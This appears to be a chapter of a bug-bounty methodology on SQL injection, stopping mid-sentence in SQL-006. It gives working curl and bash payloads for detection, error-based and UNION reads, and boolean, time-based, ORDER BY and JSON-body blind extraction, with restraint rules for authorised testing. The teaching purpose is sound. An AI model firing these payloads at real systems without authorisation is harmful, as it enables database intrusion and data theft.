# SQL · SQL injection

> A value from the request becomes part of the text of a SQL statement instead of a bound parameter. It pays
> when the database answers a question you wrote: its version and current user printed in the response, or read
> one comparison at a time through a boolean, timing or DNS channel. A database error message, a 500 on a single
> quote, or one slow response is a signal and not a finding.

| | |
|---|---|
| **Class** | `sqli` |
| **Applies when** | http, app\|api, params |
| **Pays** | 338 disclosed reports, 85 paid, median $1,350, top $25,000. The best-paid were blind injections in ordinary parameters on secondary hosts (a partner reporting page, regional services, payment endpoints), several of them behind a WAF. |
| **Weaknesses** | SQL Injection · Blind SQL Injection · CWE-89 |

## Why it pays

Every framework binds values by default, so the bug survives where binding is not available or was bypassed by
hand. Identifiers and keywords cannot be bound: `ORDER BY`, `LIMIT`, column lists, table names (#298176, GitLab's
milestone `order`, $2,000). Lists are joined into `IN (...)` (#383127, `countryFilter[]`, $25,000; #301257, a JSON
array, $1,000). Filter objects name their own columns (#1133083, `filter{"id_locality"}`, $3,500). Headers and
cookies go into logging and session queries that nobody reviews (#300176, two cookies, $1,000; #297478,
`User-Agent`). GraphQL resolvers concatenate arguments (#435066). ORM methods accept raw fragments, and the ORMs
themselves have had injections in JSON key handling (#2646493, Django `values()`, $4,263).

The other half of the paid list is plain parameters on hosts the main team does not maintain: legacy PHP
endpoints of a payment brand (Razer: 12 reports, 10 paid, mostly $2,000 each), services under a large programme's
wider scope (Mail.ru: 48 reports, 39 paid, up to $15,000 for #868436), a vendor-built microsite (#476150, $2,500),
third-party software run for the company (#206872, $2,500; #273946 and #125932, WordPress plugins, $4,500 and
$3,000). Find those hosts in recon and test their parameters by hand; they are where a quote still breaks a
query.

Payout follows proof and data. Unauthenticated read access to a production database is critical
(`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`, 9.1). The proof that was enough in the paid reports is small: #297534
shows `if(mid(@@version,1,1)=5` answering 200 and `=4` answering 500 ($1,000); #836079 shows one conditional
`SLEEP` ($2,000). Nobody needs a dump. Of the 338 reports, 76 went to one vulnerability disclosure programme
that pays nothing, so the class is common; the median of $1,350 among paid reports says it is still valued where
bounties exist.

## The crux question

**Which request values end up inside the text of a SQL statement instead of a bound parameter, and what in the
response (content, an error, time, or a lookup arriving at my host) lets me read the answer to a condition I
wrote?**

## Applicability probe

The chapter gate is `params`. Settle it from the recorded traffic, and note the facts that gate single items
while you are there: `api` (SQL-006), `graphql` (SQL-009), `waf` (SQL-012), `account` (SQL-008), `oob` (SQL-013),
and the technology tags `ruby`, `python`, `node`, `php`, `java` (SQL-011).

```bash
# 1. is there any request whose parameters change the response? names by frequency
grep -rhoE '[?&][][A-Za-z0-9_.%-]+=' "$E/recon/$H/requests/" "$E/recon/$H/urls-history.txt" 2>/dev/null | sort | uniq -c | sort -rn | head -60
# 2. names that usually sit where binding is impossible or where the client sends query structure
grep -rhoiE '[?&"](sort|order|order_?by|sort_?by|dir|direction|column|col|fields?|select|group_?by|limit|offset|per_?page|filter|where|q|query|search|keyword|term)[][A-Za-z_]*["=]' \
  "$E/recon/$H/requests/" "$E/recon/$H/routes-from-js.txt" 2>/dev/null | sort | uniq -c | sort -rn | head -40
# 3. which database: one saved error page or stack trace usually says
grep -rliE 'SQLSTATE|mysql|mariadb|postgres|PG::|ORA-[0-9]{5}|sqlite|SqlClient|SQL Server|ODBC' "$E/recon/$H/" 2>/dev/null | head
```

```bash
scripts/sane fact set "$H" params=1 --ev "GET /api/items?id=7&sort=name and 31 more parameter-taking routes in recon/$H/requests/"
# nothing takes input: every route is a static file or ignores its query string
scripts/sane fact set "$H" params=0 --ev "crawl and proxy history hold only static assets; ?x=1 on 10 routes returns byte-identical bodies"
```

With `params` false the chapter closes for the asset and the planner writes the reason. A database that is not
SQL (MongoDB, Elasticsearch, Solr, DynamoDB) does not close it: most applications keep a relational store next
to the search engine. Injection into those query languages is the NSQ chapter.

## Triage order

SQL-001 (plain parameters: quote, arithmetic and boolean pairs) → SQL-005 (sort, limit and column names: cheap
and often missed) → SQL-006 (JSON keys, nested values, arrays) → SQL-010 (search and filter expressions) →
SQL-009 (GraphQL arguments) → SQL-011 (ORM sinks for the detected framework) → for every injection point found:
SQL-002 (in-band output) → SQL-003 (boolean-blind read) → SQL-004 (time-blind read) → SQL-012 (only when the WAF
blocks the proof) → SQL-007 (headers and cookies) → SQL-008 (stored values and imports) → SQL-013 (out-of-band,
for injections with no visible effect) → SQL-014 (targeted sqlmap run for the table names).

## Items

### SQL-001 · A request parameter's value is concatenated into a SQL statement: quote, arithmetic and boolean pairs change the response

| | |
|---|---|
| **Severity** | None standalone; the entry primitive that SQL-002, SQL-003 or SQL-004 turns into a High or Critical read |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #403616, #819738, #358669, #2633959 |

- **Where:** No further gate: the chapter gate (`params`) is the only precondition. Every parameter in
  `$E/recon/$H/requests/` and `$E/recon/$H/map.md`: query and form values; path segments that name a record
  (`/item/123`: #2633959, #1527284); bracket parameters (`ids[]=7`, `filter[status]=open`: #383127, #824307);
  hidden form fields; parameters of endpoints the current front end no longer calls (old `.php` scripts, report
  and export pages, partner or admin portals, routes that appear only in `$E/recon/$H/routes-from-js.txt`).
  Numeric ids first: they are the values most often placed in the statement without quotes. One parameter at a
  time, one row per parameter in `$E/evidence/$H/SQL-001/params.md`.
- **Test:** send values that are equal for a SQL engine and different for everything else, and compare them with
  two baselines. No tool yet: a scanner cannot tell you what "true" looks like on this endpoint, and you need
  that for every later item. Use `AND`, never `OR`: an always-true `OR` returns every row of a SELECT and matches
  every row of an UPDATE or DELETE.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-001"; mkdir -p "$D"
  U="$T/api/items"; P=id; V=7                      # one endpoint, one parameter, its normal value
  probe() {                                        # $1 = label, $2 = the value sent in place of V
    curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$2" "$U" -o "$D/$P.$1.body" \
      -w "$1\t%{http_code}\t%{size_download}\t%{time_total}\t"; md5sum < "$D/$P.$1.body" | cut -c1-8; sleep 1; }
  { probe base "$V";  probe base2 "$V"                              # is the response stable at all?
    probe quote "$V'"; probe quote2 "$V''"                          # one quote breaks the statement, two do not
    probe arith "$((V+1))-1"; probe next "$((V+1))"                 # numeric V only: 8-1 must return item 7, not item 8
    probe num_t "$V AND 1=1"; probe num_f "$V AND 1=2"              # numeric boolean pair
    probe str_t "$V' AND '1'='1"; probe str_f "$V' AND '1'='2"      # string boolean pair
    probe cat_a "$V'||'"; probe cat_b "$V' '"; probe cat_c "$V'+'"  # the string rebuilt by the database
  } | tee "$D/$P.tsv"
  # database error text in any of the saved bodies
  grep -aoiE "SQL syntax[^<]{0,80}|SQLSTATE\[[0-9A-Z]+\][^<]{0,80}|ORA-[0-9]{5}[^<]{0,80}|PG::[A-Za-z]+|syntax error at or near[^<]{0,60}|unterminated quoted string|Unclosed quotation mark|Incorrect syntax near[^<]{0,60}|SqlException|SQLITE_ERROR|near \"[^\"]{0,30}\": syntax error|DB::Exception[^<]{0,80}" "$D"/$P.*.body | sort -u
  ```
  ```text
  numeric context   arith has the hash of base and next does not; num_t = base, num_f differs
  string context    quote differs from base (error text, 500, empty result) and quote2 is not an error;
                    str_t = base, str_f differs; a cat_ row equal to base names the DBMS family:
                    cat_a PostgreSQL, Oracle or SQLite; cat_b MySQL or MariaDB (cat_c matches there too when V is
                    a number); cat_c alone SQL Server
  bound or cast     arith = next (the application cast "8-1" to 8), or every changed value gives one identical response
  ```
  For a form or JSON body drop `--get` (JSON: SQL-006). For a path segment build the URL yourself:
  `U="$T/api/items/$(python3 -c 'import sys,urllib.parse as u;print(u.quote(sys.argv[1],safe=""))' "$V' AND '1'='1")"`.
  When two baselines differ (timestamps, tokens), compare a stable part of the body such as the record count
  instead of the hash. On a login form test with our own account only: `<A's user>' AND '1'='1` with the right
  password signs in and `' AND '1'='2` does not. Never send `' OR 1=1`: it signs in as whichever real user is
  first in the table.
- **Proof:** for one parameter, `$P.tsv` in which the SQL-equal variants reproduce the baseline and their false
  twins do not, the same on a second run, with one true and one false request and response saved raw. This is the
  primitive. The report needs the version and current user from SQL-002, SQL-003 or SQL-004.
- **Not a finding when:** `8-1` returns item 8 (integer cast). A single quote gives a 500 and so do two quotes, a
  double quote and a backslash: input validation or an unrelated crash. The block comes from the WAF (its own
  status, body and headers for anything containing a quote or `AND`): that says nothing about the application; go
  to SQL-012. Both members of the boolean pair differ from the baseline in the same way: the whole string was used
  as a value and matched nothing. The error names Solr, Lucene, Elasticsearch or MongoDB: another query language
  (#952501 was a Solr filter injection filed as SQL injection), the NSQ chapter. A CDN served the variants from
  cache: add a cache-busting parameter and repeat.
- **Escalate:** database error text or query output in the body: SQL-002. Only true and false differ: SQL-003.
  A quote changes nothing visible (the value goes into an INSERT or a background query): SQL-004, then SQL-013.
  A stack trace that prints the statement is INF-009 on its own and shows the exact context to close.

### SQL-002 · A database error message or a UNION column returns the DBMS version and current user in the response

| | |
|---|---|
| **Severity** | High standalone with the version and current user in the response; Critical when the request needs no account and the database is the production one |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #818972, #258582, #3395221, #1046084 |

- **Where:** No further gate: this is the first read attempt on any injection point found by SQL-001, SQL-005,
  SQL-006, SQL-009 or SQL-010. It applies where the response prints database error text (PHP warnings, a debug
  page, an API that returns `exception.message`) or renders the rows of the injected query (a detail page, a
  list, a JSON array, an export).
- **Test:** two in-band channels. Error-based: make the database raise an error whose message quotes the value of
  an expression (a failed type conversion, an XPath error). UNION: find the column count and a displayed column,
  then select the expression there. Both are single read-only SELECT expressions.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-002"; mkdir -p "$D"; U="$T/api/items"; P=id; V=7
  q() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '; sleep 1
        grep -aoE "XPATH syntax error: '[^']*'|invalid input syntax for (type )?integer: \"[^\"]*\"|converting the n?varchar value '[^']*'|DRG-11701[^<]{0,120}|sql002:[^<\"]*" "$D/last.body" | head -3; echo; }
  # error-based (string context shown; drop the first ' when V sits in the statement as a number)
  q "$V' AND extractvalue(1,concat(0x7e,version(),0x7e,current_user(),0x7e))-- -"     # MySQL, MariaDB: XPATH syntax error: '~8.0.36~app@10.0.3.7~'
  q "$V' AND 1=CAST(version() AS int)-- -"                                           # PostgreSQL: invalid input syntax for type integer: "PostgreSQL 15.4 ..."
  q "$V' AND 1=CAST(current_user::text AS int)-- -"
  q "$V' AND 1=CONVERT(int,@@version)-- -"                                           # SQL Server: Conversion failed when converting the nvarchar value '...'
  q "$V' AND 1=CONVERT(int,SYSTEM_USER)-- -"
  q "$V' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v\$version WHERE ROWNUM=1))-- -"   # Oracle with Oracle Text: DRG-11701: thesaurus <banner> does not exist
  # UNION: count the columns, find a displayed one, select the expression there
  for n in $(seq 1 12); do printf 'ORDER BY %s: ' "$n"; q "$V' ORDER BY $n-- -"; done   # the last n that does not fail is the column count
  q "-1' UNION SELECT NULL,NULL,NULL-- -"                    # as many NULLs as columns; Oracle: add FROM dual before the comment
  q "-1' UNION SELECT NULL,'sql002:marker',NULL-- -"         # move the string from column to column until it is displayed
  q "-1' UNION SELECT NULL,concat('sql002:',version(),':',current_user()),NULL-- -"
  ```
  ```text
  expression for the displayed column
  MySQL, MariaDB   concat('sql002:',version(),':',current_user())
  PostgreSQL       'sql002:'||version()||':'||current_user
  SQL Server       'sql002:'+@@version+':'+SYSTEM_USER
  Oracle           'sql002:'||(SELECT banner FROM v$version WHERE ROWNUM=1)||':'||user        ... FROM dual
  SQLite           'sql002:'||sqlite_version()                                                (no users)
  ```
  `-1` makes the original query return no row, so the UNION row is the one displayed. A column of another type
  refuses the string on PostgreSQL, Oracle and SQL Server: leave NULL there and try the next column.
- **Proof:** the raw response that contains the version banner and the current user, and the request that
  produced it. The current database name (`database()`, `current_database()`, `DB_NAME()`) may be added. No row
  of any application table.
- **Not a finding when:** the error quotes your own input, quote included, and nothing else:
  `invalid input syntax for type integer: "7'"`, `Conversion failed when converting the nvarchar value '7''`,
  `Incorrect integer value`, `Couldn't find Item with 'id'=7'`. The value arrived as a bound parameter and failed
  a type check; the statement was not changed (`version-disclosure` at most). The stack trace shows the statement
  with `?` or `$1` placeholders. The `sql002:` marker comes back because the application echoes the parameter,
  not because the database returned it: only a function result (`version()`) counts. The page shows a generic 500
  with no database text: not in-band, go to SQL-003.
- **Escalate:** SQL-014 for the table names of the application schema, the last step of the proof. When the
  current user is `root`, `sa`, `postgres` or a DBA, say so in the report and stop: file access, stacked writes
  and command execution through the database (#816254 and #592400 were reported as remote code execution) are
  described, not performed. Credential, session and reset-token tables are named, not read.

### SQL-003 · A boolean condition injected into the query is readable from the response and yields the version and current user one comparison at a time

| | |
|---|---|
| **Severity** | High standalone with the version and current user read through the oracle; Critical when the request needs no account and the database is the production one |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Blind SQL Injection · CWE-89 |
| **Prior art** | #2051931, #297534, #358669, #745938 |

- **Where:** No further gate: any injection point where SQL-001 showed a stable difference between a true and a
  false condition and SQL-002 found no output channel. Typical: a detail page that shows the record or "not
  found", a list that is full or empty, a 200 against a 500 (#297534), a redirect against a page, a changed
  response length (#358669).
- **Test:** fix one observable as the oracle (a string present only in the true response is the most robust),
  check it with conditions whose answer you know, identify the DBMS with a function that exists on one family
  only, then binary-search each character code: eight requests per character, sequential, at the engagement rate.
  Read the version and the current user and nothing else.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-003"; mkdir -p "$D"; U="$T/api/items"; P=id; V=7
  MARK='"total":1'                                   # text present in the true response and absent from the false one
  W=$(awk "BEGIN{w=1/$RATE; print (w<1)?1:w}")       # one request per second, slower when the programme rate says so
  SUB=SUBSTRING; ORD=ASCII                           # Oracle: SUB=SUBSTR      SQLite: SUB=substr ORD=unicode
  ask() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$V' AND ($1)-- -" "$U" | grep -qaF "$MARK"; local r=$?; sleep "$W"; return $r; }
  ask "1=1" && ! ask "1=2" && ask "2>1" && ! ask "2<1" || echo "the oracle is not clean: stop and fix MARK"
  for c in "1=1" "1=2"; do curl -sS -i "${HDR[@]}" $A --get --data-urlencode "$P=$V' AND ($c)-- -" "$U" -o "$D/pair-$c.txt"; sleep 1; done
  # which DBMS: each condition is valid on one family and an error (false) on the others
  for c in "CONNECTION_ID()=CONNECTION_ID()" "pg_backend_pid()=pg_backend_pid()" "@@SPID=@@SPID" \
           "(SELECT COUNT(*) FROM v\$version)>0" "sqlite_version()=sqlite_version()"; do ask "$c" && echo "true: $c"; done
  read_expr() {                                      # $1 = a SQL expression that returns a string, $2 = characters to read
    local out="" i lo hi mid
    for i in $(seq 1 "$2"); do
      ask "$ORD($SUB(($1),$i,1))>31" || break
      lo=32; hi=126
      while [ "$lo" -lt "$hi" ]; do mid=$(( (lo+hi)/2 ))
        if ask "$ORD($SUB(($1),$i,1))>$mid"; then lo=$((mid+1)); else hi=$mid; fi; done
      out="$out$(printf "\\$(printf '%03o' "$lo")")"; done
    printf '%s\n' "$out"; }
  read_expr "version()" 24      | tee "$D/version.txt"
  read_expr "current_user()" 32 | tee "$D/user.txt"
  ask "$SUB(version(),1,5)='$(cut -c1-5 "$D/version.txt")'" && echo "verified: one request a triager can replay"
  ```
  ```text
              version                                           current user
  MySQL       version()                                         current_user()
  PostgreSQL  version()                                         current_user
  SQL Server  @@version                                         SYSTEM_USER
  Oracle      (SELECT banner FROM v$version WHERE ROWNUM=1)     (SELECT user FROM dual)
  SQLite      sqlite_version()                                  none
  ```
  Numeric context: `"$P=$V AND ($1)-- -"`. When the comment is filtered, close the string instead:
  `"$P=$V' AND ($1) AND '1'='1"`.
- **Proof:** the saved true and false pair (`pair-1=1.txt`, `pair-1=2.txt`), the two strings read, and one
  verification request with its false twin (`SUBSTRING(version(),1,5)='8.0.3'` true, the same with one character
  changed false). A triager replays two requests and sees the claim hold.
- **Not a finding when:** the string read is garbage or changes between runs: the oracle is noise (an unstable
  page, a cache, a rate limiter answering some requests). The "false" response is the WAF's block page: the WAF
  reacted to a keyword, the database never saw it. The backend is a search engine: `AND` is an operator in Lucene
  syntax too, and a true and false pair can differ there without any SQL; the DBMS check and a version string
  that makes sense rule this out. The application cuts the value at the first space or quote, so both conditions
  are evaluated as the same value.
- **Escalate:** SQL-014 for the table names. SQL-013 when an out-of-band channel exists and the oracle is slow.
  State the current user's privilege in the report and stop there.

### SQL-004 · With no visible difference in the response, a short conditional delay in the injected query follows the condition

| | |
|---|---|
| **Severity** | High standalone with a timing table and the first characters of the version; Critical when the request needs no account and the database is the production one; Medium when the delay is proven and nothing can be read |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Blind SQL Injection · CWE-89 |
| **Prior art** | #868436, #836079, #476150, #203935 |

- **Where:** No further gate: parameters where SQL-001 found no difference at all, because the value goes into a
  statement whose result is never shown. Login and sign-up fields (#203935, `login[username]`; #476150, a
  parameter of `/login`), contact and newsletter forms, tracking and analytics endpoints, "check availability"
  calls, values written by an INSERT or UPDATE.
- **Test:** a delay that is conditional, short and evaluated once. Two seconds, then four to show that it scales,
  against a false twin that returns at once, three rounds, one request at a time. Use the subquery forms below:
  the database evaluates them once per statement. A bare `AND SLEEP(2)` or `OR SLEEP(2)` runs once per row
  examined, and on a large table turns two seconds into a hung connection. No `BENCHMARK`, no heavy joins, no
  delay above five seconds.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-004"; mkdir -p "$D"; U="$T/api/track"; P=ref; V=home
  t() { curl -sS "${HDR[@]}" $A --max-time 20 --get --data-urlencode "$P=$1" "$U" -o /dev/null -w '%{time_total}'; sleep 2; }
  S() { printf '%s' "$V' AND (SELECT 1 FROM (SELECT IF(($1),SLEEP($2),0))a)-- -"; }      # MySQL, MariaDB; other forms below
  for round in 1 2 3; do
    echo "base $(t "$V")   true2 $(t "$(S 1=1 2)")   false $(t "$(S 1=2 2)")   true4 $(t "$(S 1=1 4)")"
  done | tee "$D/timing.txt"
  ```
  ```text
  COND is the condition, 2 the delay in seconds
  MySQL, MariaDB   V' AND (SELECT 1 FROM (SELECT IF((COND),SLEEP(2),0))a)-- -
                   inside a stored value (INSERT, UPDATE ... SET):   0'+(SELECT 1 FROM (SELECT IF((COND),SLEEP(2),0))a)+'0
  PostgreSQL       V' AND 1=(SELECT CASE WHEN (COND) THEN (SELECT 1 FROM pg_sleep(2)) ELSE 1 END)-- -
                   inside a stored value:   V'||(SELECT CASE WHEN (COND) THEN (SELECT '' FROM pg_sleep(2)) ELSE '' END)||'
  SQL Server       V'; IF (COND) WAITFOR DELAY '0:0:2'-- -          a second statement: WAITFOR cannot sit inside a SELECT
  Oracle           V' AND 1=(SELECT CASE WHEN (COND) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',2) ELSE 1 END FROM dual)-- -
  SQLite           no sleep function; its substitutes burn CPU. Use SQL-003 or SQL-013.
  numeric context  drop the quote after V. #836079 used arithmetic: 51-CASE WHEN (COND) THEN SLEEP(6) END
  ```
  ```bash
  # read the first characters only: each true answer costs two seconds of the target's time
  BASE=0.30                                                 # the median of the base column in timing.txt
  ask() { local s; s=$(t "$(S "$1" 2)"); awk -v s="$s" -v b="$BASE" 'BEGIN{exit !(s>b+1.5)}'; }
  ask "1=1" && ! ask "1=2" && ask "2>1" && ! ask "2<1" || echo "the timing oracle is not clean: stop"
  read_expr() { local out="" i lo hi mid
    for i in $(seq 1 "$2"); do ask "ASCII(SUBSTRING(($1),$i,1))>31" || break; lo=32; hi=126
      while [ "$lo" -lt "$hi" ]; do mid=$(( (lo+hi)/2 ))
        if ask "ASCII(SUBSTRING(($1),$i,1))>$mid"; then lo=$((mid+1)); else hi=$mid; fi; done
      out="$out$(printf "\\$(printf '%03o' "$lo")")"; done; printf '%s\n' "$out"; }
  read_expr "version()" 12      | tee "$D/version-prefix.txt"      # PostgreSQL: the same; SQL Server: @@version; Oracle: SUBSTR and the banner
  read_expr "current_user()" 16 | tee "$D/user-prefix.txt"         # PostgreSQL: current_user; SQL Server: SYSTEM_USER; Oracle: user
  ```
- **Proof:** `timing.txt` with three rounds in which the true delays sit at base plus two and base plus four
  seconds and the false twin at base; the prefix of the version and the current user; the exact requests; and a
  line stating one thread and the delays used. A triager will rerun the two-second pair: it must hold.
- **Not a finding when:** the false twin is as slow as the true one: the payload text is slow to process (a WAF
  inspecting or tarpitting it, a regular expression, an error path with retries), not the database sleeping. The
  delay does not repeat or does not scale from two to four seconds. The baseline itself varies by more than a
  second: no timing conclusion is possible on this endpoint. The delay is a multiple of what you asked for: the
  injection is real and the form is evaluated per row; stop using it and switch to the subquery form. The value
  is processed by a queue worker: nothing is ever slow in the response; that case is SQL-013.
- **Escalate:** SQL-013 is faster and leaves a cleaner record when the database can reach the internet. SQL-014
  with `--technique=T --time-sec 2` for the table names; expect it to be slow and keep it single-threaded.

### SQL-005 · A sort, direction, limit or column-name parameter is copied into ORDER BY, LIMIT or the select list as SQL text

| | |
|---|---|
| **Severity** | High standalone with the version and current user read through the row order or an error; Critical when the request needs no account and the database is the production one |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #298176, #164945, #3462991 |

- **Where:** No further gate: any list endpoint qualifies. Parameters named `sort`, `order`, `orderby`,
  `order_by`, `sortBy`, `dir`, `direction`, `column`, `fields`, `select`, `group_by`, `limit`, `offset`,
  `per_page`; DataTables `order[0][column]`, `order[0][dir]` and `columns[0][data]`; JSON:API `sort=-created_at`
  and `fields[users]=id,name`; OData `$orderby`, `$select`, `$top`; sortable table headers; the column chooser of
  an export. A database cannot take an identifier or a keyword as a bound parameter, so code that binds every
  value still concatenates here (#298176 `order`, #164945 `limit`, #3462991 a column type).
- **Test:** no quote is needed in these positions and quote tests say nothing. Show that the value is parsed as
  SQL: a position number out of range raises a database error, an expression is accepted where only a column
  name should be, and a `CASE` expression flips the row order or raises an error according to a condition. That
  flip is a boolean oracle.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-005"; mkdir -p "$D"; U="$T/api/users"; P=sort
  s() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '
        printf '%s   rows=%s first=%s\n' "$1" "$(jq -r '.data|length' "$D/last.body" 2>/dev/null)" "$(jq -r '.data[0].id' "$D/last.body" 2>/dev/null)"; sleep 1; }
  s "id"; s "name"                                   # two legal values: note the first row under each
  s "9999"; s "id,"; s "id'"                         # position out of range, dangling comma, quote: database error text or a 500
  s "id desc"; s "id,name"; s "lower(name)"          # more than a bare column name is accepted
  s "id*(CASE WHEN (1=1) THEN 1 ELSE -1 END)"        # ascending by id
  s "id*(CASE WHEN (1=2) THEN 1 ELSE -1 END)"        # descending by id: another first row
  P=dir;    s "asc"; s "asc,id*(CASE WHEN (1=2) THEN 1 ELSE -1 END)"      # the direction parameter is concatenated after the column
  P=limit;  s "1"; s "1 OFFSET 1"                    # MySQL, PostgreSQL, SQLite: the second row comes back instead of the first
            s "(SELECT 1)"; s "(SELECT 2)"           # PostgreSQL: one row, then two; the row count answers (CASE WHEN (COND) THEN 1 ELSE 2 END)
            s "1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)"   # MySQL 5.x only: the version inside the error text
  P=fields; s "id,name"; s "id,version() AS name"; s "id,(SELECT current_user) AS name"   # the value printed in the name column
  ```
  ```text
  when the order is not visible, an error answers the condition (true = normal response, false = database error)
  MySQL, MariaDB   (SELECT (CASE WHEN (COND) THEN 1 ELSE 2*(SELECT 2 FROM information_schema.plugins) END))
  PostgreSQL       (SELECT (CASE WHEN (COND) THEN 1 ELSE 1/(SELECT 0) END))
  SQL Server       (SELECT (CASE WHEN (COND) THEN 1 ELSE 2*(SELECT 2 UNION ALL SELECT 3) END))
  Oracle           (SELECT (CASE WHEN (COND) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM dual) END) FROM dual)
  ```
  ```bash
  # read the version through the order: the same loop as any boolean oracle, eight requests per character
  P=sort; ASC=$(s "id" | sed 's/.*first=//')
  ask() { [ "$(s "id*(CASE WHEN ($1) THEN 1 ELSE -1 END)" | sed 's/.*first=//')" = "$ASC" ]; }
  ask "1=1" && ! ask "1=2" || echo "the order oracle is not clean: stop"
  read_expr() { local out="" i lo hi mid
    for i in $(seq 1 "$2"); do ask "ASCII(SUBSTRING(($1),$i,1))>31" || break; lo=32; hi=126
      while [ "$lo" -lt "$hi" ]; do mid=$(( (lo+hi)/2 ))
        if ask "ASCII(SUBSTRING(($1),$i,1))>$mid"; then lo=$((mid+1)); else hi=$mid; fi; done
      out="$out$(printf "\\$(printf '%03o' "$lo")")"; done; printf '%s\n' "$out"; }
  read_expr "version()" 24 | tee "$D/version.txt"; read_expr "current_user" 32 | tee "$D/user.txt"
  ```
  `id` must be a numeric column for the multiplication; with UUID keys use another numeric column or the error
  forms. SQL Server spells the functions `@@version` and `SYSTEM_USER`; Oracle uses `SUBSTR`, the `v$version`
  banner and `user`.
- **Proof:** the pair of requests in which only the condition differs and the first row (or 200 against 500)
  flips, repeated, and the version and current user read through it; or, where errors are printed, the version
  inside the error text.
- **Not a finding when:** every value outside a fixed list gives the default order or a 400 (an allow-list).
  `id,name` and `id desc` work and `lower(name)` or the `CASE` expression is refused with "unknown field": a
  documented multi-column sort mapped onto validated columns. The error is Elasticsearch's
  (`No mapping found for [x] in order to sort on`) or the sort happens in application code. `1 OFFSET 1` returns
  the same row as `1`: the value was cast to an integer. The error says `Unknown column 'id'' in 'order clause'`
  with your quote inside the quoted name: the identifier was escaped. Rails 6.1 and later answer
  `ActiveRecord::UnknownAttributeReference` to anything beyond a column, a simple function call and a direction:
  the framework guard, working. Sorting by a column you are not shown (`sort=password_hash`) and reading the order
  is an access-control leak, BAC-009, not SQL injection.
- **Escalate:** SQL-014 with `-p sort --level 2` (sqlmap's ORDER BY tests start at level 2). The ORM method
  behind the parameter: SQL-011. A GraphQL `orderBy` argument of type String: SQL-009.

### SQL-006 · A JSON key, nested value or array element in an API body reaches the query as SQL text

| | |
|---|---|
| **Severity** | High standalone with the version and current user read through the body position; Critical when the request needs no account and the database is the production one |
| **Requires** | api |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #301257, #1133083, #383127, #3257171 |

- **Where:** JSON request bodies in `$E/recon/$H/requests/`: nested filter objects (`{"filter":{"status":"open"}}`,
  #1133083); arrays of ids in bulk and batch endpoints (`{"ids":[1,2,3]}`: delete many, export selected, assign
  to many), which become `IN (1,2,3)` by joining (#301257 was a JSON array, #383127 a `[]` parameter); keys that
  name columns (`where`, `order`, `fields`, `group`); numbers sent as strings. The same shapes exist as bracket
  parameters in forms and query strings (`ids[]=7`, `filter[status]=open`). Quick passes and scanners test
  top-level string values and stop.
- **Test:** four changes, each against the unmodified request. The SQL-001 pairs inside a nested value. An array
  element that closes the `IN (` list and adds a condition. A key renamed so that it carries a quote or a
  condition: an "unknown column" or syntax error naming your text shows that keys are copied into the statement.
  A type change (number, array or object where a string is expected), which finds serialisers that render the
  structure into SQL.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-006"; mkdir -p "$D"; U="$T/api/v1/orders/search"
  j() { curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' -d "$1" -o "$D/last.body" \
          -w '%{http_code} %{size_download} %{time_total}  '; printf '%s\n' "$1" | cut -c1-110; sleep 1; }
  # nested value: quote, doubled quote, boolean pair
  for v in "open" "open'" "open''" "open' AND '1'='1" "open' AND '1'='2"; do j "$(jq -cn --arg v "$v" '{filter:{status:$v},page:1}')"; done
  # array element joined into IN (...): arithmetic, then a pair that closes the list
  for v in "7" "8-1" "7) AND (1=1" "7) AND (1=2"; do j "$(jq -cn --arg v "$v" '{ids:[$v]}')"; done
  # key used as a column name: unquoted, then the three identifier quotes
  for k in "status" "1=1 AND status" "1=2 AND status" "status'" 'status"' 'status`'; do j "$(jq -cn --arg k "$k" '{filter:{($k):"open"},page:1}')"; done
  # type change where a string is expected
  for b in '{"filter":{"status":1}}' '{"filter":{"status":["open"]}}' '{"filter":{"status":{"status":1}}}' '{"filter":{"status":null}}'; do j "$b"; done
  # the same shapes as bracket parameters (a key that contains = or a space is percent-encoded by hand)
  curl -sS "${HDR[@]}" $A --get --data-urlencode "ids[]=7) AND (1=2" "$T/report" -o /dev/null -w '%{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A "$T/report?filter%5B1%3D2%20AND%20status%5D=open" -o /dev/null -w '%{http_code} %{size_download}\n'
  ```
  With a true and false pair in hand, read the version and the current user through it: put
  `ASCII(SUBSTRING(version(),i,1))>n` in place of `1=1` and binary-search n from 32 to 126 for i from 1 to 24,
  eight requests per character, one request per second. With database errors in the response use the
  expressions of SQL-002 in the same position.
- **Proof:** the unmodified request, the true variant with the same result, the false variant with a different
  one, and the version and current user read through that position, all saved raw.
- **Not a finding when:** a schema validator answers 400 ("must be string", "must be integer") to every changed
  type. A renamed key gives "unknown field" from the serializer's allow-list. The SQL error shows your key inside
  identifier quotes with its quote intact or doubled (`Unknown column 'status'' in 'where clause'`): escaped, and
